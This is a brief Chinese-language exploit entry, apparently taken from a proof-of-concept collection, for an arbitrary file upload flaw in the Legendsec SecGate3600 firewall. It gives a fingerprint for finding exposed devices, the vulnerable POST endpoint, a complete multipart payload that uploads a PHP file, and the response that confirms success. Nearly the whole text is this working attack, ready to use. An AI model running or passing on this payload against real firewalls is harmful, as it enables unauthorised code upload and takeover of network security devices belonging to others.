# 网神SecGate3600防火墙rootpath任意文件上传

网神SecGate3600防火墙rootpath ｜ 文件上传 ｜ —
- **指纹**：`body="./images/lsec/login/loading.gif"`
- **请求**：`POST /?g=sys_hand_upfile HTTP/1.1`

**Payload**
```
--gttd4i4aadwh9lmlp1ez
Content-Disposition: form-data; name="upfile"; filename="dudesite.php"
<?php echo md5('dudesite');?>
--gttd4i4aadwh9lmlp1ez
Content-Disposition: form-data; name="submit_post"
sys_hand_upfile
--gttd4i4aadwh9lmlp1ez--
```
- **响应特征**：200 a9d68bbbcfd89